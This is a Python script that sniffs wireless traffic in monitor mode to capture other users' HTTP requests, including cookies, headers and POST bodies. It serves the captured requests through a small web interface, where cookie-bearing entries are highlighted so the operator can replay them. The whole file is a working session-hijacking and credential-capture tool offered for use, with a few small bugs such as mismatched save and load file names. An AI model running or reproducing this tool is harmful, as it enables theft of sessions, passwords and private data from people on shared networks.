import os
import sys
import json
import socket
import urllib
import threading
import traceback

from Queue import Queue
from urllib2 import urlparse
from collections import defaultdict

from scapy.all import *
import scapy_http.http as http

host = '0.0.0.0'
server_ip = sys.argv[1]
port = int(sys.argv[2])
iface = 'mon0'

httphead = 'HTTP/1.1 200 ok\r\n\r\n'
ip_dict = defaultdict(dict)

if os.path.exists('./proxy_server.json2'):
    try:
        with open('proxy_server.json2') as f:
            ip_dict.update(json.load(f))
    except:
        pass


def prn(pkt):
    global ip_dcit

    if not pkt.haslayer(http.HTTPRequest):
        return

    print(pkt.summary())
    url = 'http://'+pkt.Host+pkt.Path
    headers = {i.split(": ")[0]: i.split(": ")[1] \
               for i in pkt.Headers.split("\r\n") if ': ' in i}
    data = pkt.load if pkt.Method == 'POST' and hasattr(pkt, 'load') else 'None'
    ip_dict[pkt[IP].src][url] = (pkt.Method, headers, data)


def main():
    sniff_thread = threading.Thread(target=sniff,
                                    kwargs={'iface': iface,
                                            'prn': prn,
                                            'filter': 'tcp[13]&8==8'})
    sniff_thread.setDaemon(True)
    sniff_thread.start()

    proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_sock.bind((host, port))
    proxy_sock.listen(1024)

    while True:
        conn, addr = proxy_sock.accept()
        print("client connent:{0}:{1}".format(addr[0], addr[1]))

        client_data = conn.recv(10240)

        try:
            req_body = http.HTTPRequest(client_data)
        except Exception:
            traceback.print_exc()
            continue

        method = req_body.Method

        if method not in ['GET', 'POST']:
            continue

        if req_body.Host == server_ip or \
           req_body.Host == server_ip+':%d' % port:
            # get ip list
            if req_body.Path == '/':
                html = '</br>\n'.join(['<a href="{0}">{0}<a>'.format(i) \
                                       for i in ip_dict.keys()])
                conn.send(httphead+html)
                conn.close()
            # get url list of specify ip
            elif req_body.Path[1:] in ip_dict.keys():
                ip = req_body.Path[1:]
                hrefs = []
                for url, value in ip_dict[ip].items():
                    if 'cookie' in [i.lower() for i in value[1].keys()]:
                        color = '#FF3811'
                    else:
                        color = '#4590F9'
                    hrefs.append(('<a href="{0}/{1}" style="color:{2}">{3}====>{4}<a>'
                                  '').format(ip, url.encode('base64'), color,
                                             value[0], url[:100]))
                html = '</br>\n'.join(hrefs)
                conn.send(httphead + html)
                conn.close()
            # get specify request
            else:
                a = req_body.Path.split("/")
                if len(a) < 3:
                    continue
                try:
                    ip = a[1]
                    url = '/'.join(a[2:]).decode('base64')
                    method, headers, data = ip_dict[ip][url]
                    if 'Proxy-Connection' in headers:
                        headers.pop("Proxy-Connection")
                    print(url, method)

                    conn.send(httphead + json.dumps({'method': method,
                                                     'headers': headers,
                                                     'data': urllib.quote(data)}))
                    conn.close()
                except Exception:
                    traceback.print_exc()
                    conn.close()
                    continue
        else:
            conn.send('error')
            conn.close()
    proxy_sock.close()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        with open('proxy_server.json', 'w') as f:
            json.dump(ip_dict, f)
        print('[=] bye')

#html = '</br>\n'.join(['<a href="{0}/{1}" style="color:{2}">{3}====>{4}<a>'.format(ip, url.encode('base64'), '#FF3811' if 'cookie' in [i.lower() for i in value[1].keys()] else '#4590F9', value[0],  url[:100]) for url,value in ip_dict[ip].items()])
